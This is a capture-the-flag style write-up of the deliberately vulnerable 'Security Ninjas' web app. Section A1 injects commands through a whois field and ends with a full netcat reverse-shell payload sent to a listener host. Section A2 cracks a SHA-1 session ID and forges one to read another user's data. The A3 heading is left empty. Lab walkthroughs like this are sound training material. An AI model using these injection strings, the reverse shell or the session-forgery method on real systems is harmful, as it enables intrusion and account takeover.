This is a Vulnerable Machine ```Security Ninjas```.

We can test this for common web vulnerabilities

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/daaddc57-1780-4268-b995-afff747dbbaf)

Well, lets dig in


# A1
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/17788d91-cbd8-4094-a1c4-63fe307635dc)

We were told that this page has an ```OS Command Injection``` flaw

Lets provide a domain name say ```google.com```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/84db4b64-e987-4ed0-9fcb-eee65f7835f9)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/89c48ad7-31a2-4491-9d29-a7c7f0085987)

So we got the whois look up results for the domain name ```google.com```

The ```semicolon(;)``` is often used as a delimiter so seperate multiple commands within a single input field. So, we can try to use the ```semicolon(;)``` character to run multiple commands.

For example lets say we want to run the ```id``` command alongside the domain name we provided. So, we'll be having an input like this ```google.com;id```

Lets try to execute this to see what happens

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/730ee60f-38a8-4c9a-85a4-5cf2f525d477)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7a23174f-f258-4b4d-8bad-91b5efffcb21)

Scrolling down,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6cef73f1-ffc0-4d30-858d-a7a1e4217465)

It worked hehe, we were able to successfully execute the linux command

Other delimiter characters like ```|``` and ```||``` also works

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a25768ec-3be8-489a-9333-e3c310810ef2)

Lets get a reverse shell from this

payload:```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f```

Ensure you set up a netcat listener

So, our input would look like this ```google.com|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.168 1234 >/tmp/f```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c6f015db-919f-44b6-82ef-1c31a1c74737)

Checking my netcat listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/26861a22-4676-4f97-af6f-8a515b1e3055)

I was able to get a reverse shell.

Well, that's all for this challenge since we've successfully exploited the vulnerability there. 

--------------------------

# A2
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/11a9f185-7ec9-4718-9d2f-201b125f8df8)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0a6fc465-dff6-4ecf-8bde-eb388da15227)

So the exercise here is to get ```user2``` personal information by exploiting the ```Broken Authentication and Session Management``` vulnerability

Lets try to login with the details they provided to us

username:```user1```        password:```145_Bluxome```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fa96800c-803b-4392-aa4e-c3089c40e40d)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c8aca000-2109-4af5-b21d-b80d262b5051)

Cool, we are logged in

Lets try to view personal details, but this time we'll capture the request to burpsuite and send it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2dce07c1-a515-4bef-9e4e-f8567e4b1394)

We were able to view the personal information of ```user1```. Well, something eyes catching here is the ```sessionID```.

I ran ```hash-identifier``` on that hash and found

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ hash-identifier     
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: b3daa77b4c04a9551b8781d03191fe098f325e67

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```
Cool, the hash is ```SHA-1```. Lets crack it to see what it says

Save the hash in a file and use john

command:```john hash  --wordlist=/home/bl4ck4non/Documents/rockyou.txt --format=RAW-sha1```

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ john hash  --wordlist=/home/bl4ck4non/Documents/rockyou.txt --format=RAW-sha1
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
user1            (?)     
1g 0:00:00:02 DONE (2023-09-29 16:37) 0.4878g/s 1446Kp/s 1446Kc/s 1446KC/s user1 01989..user074
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. 
```
John cracked the hash to be ```user1```. 

So, we can say the ```sessionID``` is ```user1```.

To read ```user2``` personal information, what we can do is generate a ```sha1``` hash for ```user2```.

I used this [website](https://codebeautify.org/sha1-hash-generator) for that

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ff21b9eb-2391-4942-8983-6e12d16d59d7)

Now. we'll be replacing the previous ```sessionID``` value with ```a1881c06eec96db9901c7bbfe41c42a3f08e9cb4```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f23c1c76-e085-444c-8214-959c89fc97fd)

cool cool, we are able to read the personal information for ```user2```.

That will be all for this challenge since we have successfully exploited the vulnerability😎

-----------------------------

# A3
<hr>













